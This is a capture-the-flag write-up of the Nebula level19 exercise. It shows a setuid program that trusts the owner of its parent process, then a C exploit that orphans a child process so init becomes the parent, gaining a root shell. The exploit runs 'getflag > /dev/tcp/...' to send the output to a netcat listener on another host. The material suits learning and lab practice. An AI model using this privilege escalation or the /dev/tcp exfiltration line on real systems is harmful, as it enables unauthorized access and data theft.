__LEVEL19 code:__
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent's /proc entry, so we can verify its user id */

  snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());

  /* stat() it */

  if(stat(buf, &statbuf) == -1) { //stat gives information about a file /proc/ProgramPID
      printf("Unable to check parent process\n");
      exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) { //checks if the program that executed it is 0
      /* If root started us, it is ok to start the shell */ 

      execve("/bin/sh", argv, envp);
      err(1, "Unable to execve");
  }

  printf("You are unauthorized to run this program\n");
}
```

My first thought is that if we can modify what proc/pid tells about our program we should be able
to acces the shell.

After a lot of searching I found out about orphan processes and it turns out that an orphan process in our 
version of linux Init the system process is set to be the new parent of our orphan process which is own by root
so if we make an orphan process execute this program we'll get full acces.

```c
#include <unistd.h> 
#include <stdio.h> 
#include <stdlib.h>

int main(){
	int child; //if this equals zero we are on the child process
	child = fork();
	if(child==0){
		printf("child sleeping \n");
		sleep(1);
		char* argv[] = {"/bin/sh","-c","getflag > /dev/tcp/192.168.56.1/8888"};
		execv("/home/flag19/flag19",argv);
	}
	else{
		printf("parent exiting \n");
		exit(0);
	}
	return 0;
}

```

I discovered that /bin/sh has -c option that let us execute another command so I redirected that output
to my main pc

```sh
C:\Users\migue\Documents\Nebula_Exploits>nc -l -p 8888
You have successfully executed getflag on a target account
```

So I finally finished Nebula exploit exercises it was awesome.
